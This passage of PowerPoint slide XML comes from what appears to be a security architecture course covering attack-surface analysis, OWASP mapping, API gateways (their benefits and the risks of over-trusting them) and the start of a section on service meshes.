            <a:endParaRPr lang="en-US" sz="2400"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>CI pipeline → Dependency compromise? Secrets leakage?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="514350" indent="-514350">
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="8719187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6885-7563-C674-D913-A14DF30E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4F853-6127-8A9F-2D69-CE7E1F89C39F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.2.4 - Mapping OWASP + AS</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{46B93787-0BF7-7018-9758-E97D7E61E444}"/>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dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>3.   Ask: what’s the security impact if it fails this way?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Data exposure?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Lateral movement?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Privilege escalation?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Stealthy persistence?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="35429514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21809-FB24-E464-A442-8EFEE6045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74700-E452-F9EE-58C4-BE68CC168200}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.2.4 - Mapping OWASP + AS</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E2A24413-7455-5EEA-60AC-46AF763E9FC3}"/>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b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>4.   Mitigate and re-check</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Add controls (auth, validation, hardening).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>See how those controls themselves change the attack surface:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400"/>
          </a:p>
          <a:p>
            <a:pPr marL="971550" lvl="1" indent="-285750">
              <a:buFont typeface="Arial"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Gateway added → new config attack surface.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000"/>
          </a:p>
          <a:p>
            <a:pPr marL="971550" lvl="1" indent="-285750">
              <a:buFont typeface="Arial"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Service mesh added → sidecar config, certs, and policies.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="73635177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F903-469A-F765-F1A7-897B0C0C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1E74F-7CE3-C5D0-A08E-17FEF4F22A3B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.2.3 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>API Gateways</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E3A652D4-F6C7-106E-E82B-528F860FB546}"/>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ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>An </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>API gateway</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> is a reverse proxy sitting at the edge, handling external requests and routing them to backend services</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="10880628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3A2FB-70A1-966B-FDB2-6748B0B0E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B5DC1-E86D-02D0-7A85-DF23EFD46AB9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.2.3 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>API Gateways as security tools</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8342FC4F-DC93-D66A-28FE-5A066B87E782}"/>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ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>The </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>API gateway</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> mostly secures </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>north–south</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> traffic, but can help constrain </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>east–west </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>by:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Ensuring internal-only services are </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>not</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> reachable externally.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Acting as a narrow choke point between external clients and internal systems.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="265163499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DF07-6C07-7CF3-FF38-5AF23A6FC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C473B-421E-CC3F-E409-D219C547054C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.2.3 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>API Gateway Security Benefits 01</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4F2BE5DF-4677-D209-C175-5DB556808B1B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1825625"/>
            <a:ext cx="9166771" cy="4692924"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Centralized security controls</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Rate limiting &amp; DoS protection</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Surface reduction</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Centralized logging &amp; monitoring</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Web Application Firewall (WAF) integration</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="222528571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AC2C-1D73-5BF3-9733-F624089F6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2AF3F-8045-9315-382D-8EB6703205C1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.2.3 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>API Gateway Security Implications 01</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E7236E8C-4212-D4B7-CA93-600B71FE51F1}"/>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Over-trusting the gateway</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Services start thinking: “If it got to me, it’s safe.”</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>They stop performing </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>authorization checks</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> or input validation.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>A single misrouted path, internal caller, or compromised gateway node means </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>full compromise</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> of downstream services.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="98782612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AE74-140E-B941-2C42-57EC59D22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DF645-03F2-EC35-67CB-26AD5E980ED4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.2.3 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>API Gateway Security Implications 02</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C9AEBED1-1D0F-B002-EFF3-FDB9A3EF1A2C}"/>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Mixed responsibilities</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Gateway does TLS termination, auth, routing, AND internal service-to-service routing.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Over time, you lose the clear boundary: which traffic is “internet-facing” vs “internal”?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="42469522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6427-308D-B6B5-16AA-7F1E09366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C73AF-894C-0AE4-7F1A-0DB388EBDF19}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.2.3 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>API Gateway Security Implications 02</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{EC62B4CF-1D6E-E7EF-332D-D8471932C25A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1825625"/>
            <a:ext cx="9166771" cy="4692924"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Mixed responsibilities</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Gateway does TLS termination, auth, routing, AND internal service-to-service routing.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Over time, you lose the clear boundary: which traffic is “internet-facing” vs “internal”?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="32209091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6C491-24FA-4184-F222-81AA17255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19C18-F456-66C1-AF62-8D2466C1B439}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.2.3 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>The Service Mesh</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DABD3A80-B39F-128A-4836-9EEE2A68FA0D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1825625"/>
            <a:ext cx="9166771" cy="4692924"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>A </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>service mesh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> is an infrastructure layer that manages </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>service-to-service (east–west)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> communication in a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Microservices</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
